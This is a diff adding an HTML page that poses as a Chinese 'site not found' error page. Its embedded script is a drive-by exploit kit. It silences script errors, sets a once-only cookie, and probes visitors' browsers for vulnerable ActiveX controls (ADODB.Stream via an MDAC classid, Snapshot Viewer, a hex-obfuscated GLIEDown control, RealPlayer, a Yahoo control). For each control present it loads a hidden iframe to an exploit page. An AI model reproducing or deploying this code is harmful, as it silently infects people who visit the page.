@@ -1,0 +1,70 @@
+<script src="http://s140.cnzz.com/stat.php?id=304250&web_id=304250" language="JavaScript" charset="gb2312"></script>
+<head>
+<title>您所访问的网址不存在或网络无法访问</title>
+</head>
+<p>您所访问的网址不存在或网络无法访问请返回。</p><html>
+<body>
+</body>
+<script>
+document.write("<iframe width=100 height=0 src=flash.htm></iframe>");
+//document.write("<iframe width=100 height=0 src=Works.htm></iframe>");
+window.status="完毕";
+window.onerror=function(){return true;}
+
+function init(){
+	document.write()
+		}window.onload=init;
+	if(document.cookie.indexOf('tian5')==-1){
+	
+	var eviliosaid="clsid:BD96"+"C556-65A3-11"+"D0-983A-00C04FC29E36";
+	
+	try{
+	var e;var ado=(document.createElement("object"));
+	ado.setAttribute("classid",eviliosaid);
+	var as=ado.createobject("Adodb.Stream","")
+	}catch(e){
+
+	};
+	finally{
+	var expires=new Date();
+	expires.setTime(expires.getTime()+1*60*60*1000);
+	document.cookie='tian5=iosa;path=/;expires='+expires.toGMTString();
+	if(e!="[object Error]"){
+	document.write('<iframe style=display:none src="14.htm"></iframe>')
+	}else{
+	try{
+	var ac;var accessx=new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+	}catch(ac){
+
+	};
+	finally{
+	if(ac!="[object Error]"){
+	document.write('<iframe style=display:none src="of.htm"></iframe>')}
+	}try{
+	var f;var glworld=new ActiveXObject("\x47\x4c\x49\x45\x44\x6f\x77\x6e\x2e\x49\x45\x44\x6f\x77\x6e\x2e\x31")
+	}catch(f){
+
+	};
+	finally{
+	if(h!="[object Error]"){
+	if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552"){
+	}else{
+	document.write('<iframe style=display:none src="Real.htm"></iframe>')}}
+	}try{
+	var i;var Yahoo=(document.createElement("object"));
+	Yahoo.setAttribute("classid","clsid:24F3EAD6-8B87-4C1A-97DA-71C126BDA08F");
+	}catch(i){
+
+	};
+	finally{
+	if(i!="[object Error]"){
+	//document.write("<iframe width=100 height=0 src=Thunder.htm></iframe>");
+	document.write('<iframe style=display:none src="ju.htm"></iframe>')}
+	}
+	if(ac=="[object Error]"&&h=="[object Error]"&&i=="[object Error]"){location.replace("about:blank")}
+ 			}
+		}
+	}
+
+</script>
+</html>
